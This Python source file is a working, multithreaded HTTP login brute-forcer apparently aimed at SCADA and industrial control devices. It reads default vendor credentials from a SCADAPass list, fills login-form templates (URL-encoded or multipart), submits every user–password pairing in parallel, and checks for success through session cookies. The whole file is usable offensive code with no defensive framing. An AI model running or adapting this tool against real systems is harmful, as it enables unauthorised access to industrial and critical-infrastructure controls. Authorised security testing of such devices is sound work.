import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.logger import setup_logger
from utils.payload_loader import load_payloads
from utils.scadapass_updater import update_scadapass_local, load_scadapass_credentials

logger = setup_logger()

# def try_http_login(target, path, post_data_template,port, error_msg, user, password):
#     url = f"http://{target}{path}"
#     if port == None:
#         url = f"http://{target}{path}"
#     else:
#         url = f"http://{target}:{port}{path}"

#     post_data = post_data_template.replace('^USER^', user).replace('^PASS^', password)
#     data = dict(pair.split('=') for pair in post_data.split('&'))
#     try:
#         response = requests.post(url, data=data, timeout=5)
#         if error_msg not in response.text:
#             logger.info(f"Valid credentials found: {user}:{password}")
#             return (user, password)
#     except Exception as e:
#         logger.error(f"HTTP brute force error for {user}:{password} - {e}")
#     return None


def parse_multipart_template(template: str, user: str, password: str) -> dict:
    files = {}
    parts = re.split(r'-{5,}\d+\r?\n', template)  # split on boundary lines
    for part in parts:
        if 'Content-Disposition' not in part:
            continue
        name_match = re.search(r'name="([^"]+)"', part)
        value_match = re.search(r'\r?\n\r?\n(.*?)\r?\n?$', part.strip(), re.DOTALL)
        if name_match:
            field_name = name_match.group(1)
            field_value = value_match.group(1).strip() if value_match else ''
            if '^USER^' in field_value:
                files[field_name] = (None, user)
            elif '^PASS^' in field_value:
                files[field_name] = (None, password)
            else:
                files[field_name] = (None, field_value)
    return files

def try_http_login(target, path, post_data_template, port, error_msg, user, password):
    url = f"http://{target}:{port}{path}" if port else f"http://{target}{path}"
    url2 = f"http://{target}:{port}/" if port else f"http://{target}/"

    post_data = post_data_template.replace('^USER^', user).replace('^PASS^', password)

    try:
        print(f"trtyingh {user = }, {password = }")
        # Detect multipart-form boundary by checking for dashes
        if post_data.strip().startswith('---'):
            # Multipart format — manual parsing
            files = parse_multipart_template(post_data_template, user, password)
            response = requests.post(url, files=files, timeout=5)
        else:
            # URL-encoded format
            data = dict(pair.split('=') for pair in post_data.split('&'))
            response = requests.post(url, data=data, timeout=5)
        # print("connected")
        cookies = response.cookies
        response2 = requests.get(url2, cookies=cookies, timeout=9)
        # print(f"connected2 , {response2.text = }")


        if error_msg not in response.text and "not logged" not in response2.text:
            # print(f"{response.text = }")
            logger.info(f"Valid credentials found: {user}:{password}")
            return (user, password)

    except Exception as e:
        logger.error(f"HTTP brute force error for {user}:{password} - {e}")

    return None

def http_brute_force_with_scadapass(target, path, post_data_template, error_msg, scadapass_file, system_name=None,port=80, max_workers=20):
    users = []
    passwords = []
    # scadapass_file = update_scadapass_local()
    scadapass_creds = load_scadapass_credentials(scadapass_file) if scadapass_file else {}

    if system_name and system_name in scadapass_creds:
        creds = scadapass_creds[system_name]
        users = [u for u, _ in creds]
        passwords = [p for _, p in creds]
        print(f"{system_name = }, {users = },{passwords = }")
    else:
        for creds in scadapass_creds.values():
            users.extend([u for u, _ in creds])
            passwords.extend([p for _, p in creds])
            # print(f"{passwords = }")

    users = list(set(users)) or ['admin', 'user', 'root']
    passwords = list(set(passwords)) or ['admin', 'user', 'password', '123456']

    valid_credentials = None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for user in users:
            for password in passwords:
                # print(f"trying {user = } : {password = }")
                futures.append(executor.submit(try_http_login, target, path, post_data_template,port, error_msg, user, password))
        for future in as_completed(futures):
            result = future.result()
            if result:
                valid_credentials = result
                break
    if not valid_credentials:
        logger.info("No valid HTTP credentials found")
    return valid_credentials
